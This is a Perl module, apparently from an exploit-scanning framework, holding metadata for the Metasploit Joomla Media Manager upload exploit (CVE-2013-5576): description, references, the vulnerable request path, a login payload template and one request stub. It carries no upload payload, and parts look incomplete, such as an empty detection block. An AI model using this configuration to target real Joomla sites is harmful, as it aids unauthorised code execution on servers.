package MSFExploits::Exploits::JOOMLA::MSF::JoomlaMediaUploadExec;
# use parent qw(MSFExploits::Exploit MSFExploits::Services::JOOMLA);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

# # use MSFExploits::Functions::Basic;
# # use MSFExploits::Functions::Errors;
# # use MSFExploits::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "JoomlaMediaUploadExec";

   my $DETECTION = {

   };

my $EXPLOIT = {
  CVE         => "CVE-2013-5576",
  DESCRIPTION => "

        This module exploits a vulnerability found in Joomla 2.5.x up to 2.5.13, as well as

        3.x up to 3.1.4 versions. The vulnerability exists in the Media Manager component,

        which comes by default in Joomla, allowing arbitrary file uploads, and results in

        arbitrary code execution. The module has been tested successfully on Joomla 2.5.13

        and 3.1.4 on Ubuntu 10.04. Note: If public access isn't allowed to the Media

        Manager, you will need to supply a valid username and password (Editor role or

        higher) in order to work properly.

      ",
  E_TITLE     => "jform_articletext",
  METHOD      => "POST",
  MSF_MODULE  => "joomla_media_upload_exec",
  OSVDB       => 95933,
  PATH        => "__U\\.PATH__?__U\\.QUERY__?asset=com_content&author=&format=&view=images&folder=&option=com_media&view=images&e_name=jform_articletext&asset=com_content&author=&view=login&task=user.login&",
  PATHS       => ["__U\\.PATH__?__U\\.QUERY__", "joomla"],
  PAYLOAD     => "username=__USERNAME__&password=__PASSWORD__&",
  REFERENCES  => [
                   "http://developer.joomla.org/security/news/563-20130801-core-unauthorised-uploads",
                   "http://www.cso.com.au/article/523528/joomla_patches_file_manager_vulnerability_responsible_hijacked_websites/",
                   "https://github.com/joomla/joomla-cms/commit/fa5645208eefd70f521cd2e4d53d5378622133d8",
                   "http://niiconsulting.com/checkmate/2013/08/critical-joomla-file-upload-vulnerability/",
                   "https://community.rapid7.com/community/metasploit/blog/2013/08/15/time-to-patch-joomla",
                 ],
  VARIABLES => {
    'PATH' =>       { DESCRIPTION => "The base path to Joomla", VALUE => "/joomla" },
    'USERNAME' =>       { DESCRIPTION => "", VALUE => "" },
    'PASSWORD' =>       { DESCRIPTION => "Password to login with", VALUE => "" },
  },

  TYPE => 'MSF',
  PLATFORM => 'UNIX',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'GET',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #1 Request : [GET] ',
      HEADERS      => {
        'Cookie' => '',
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;
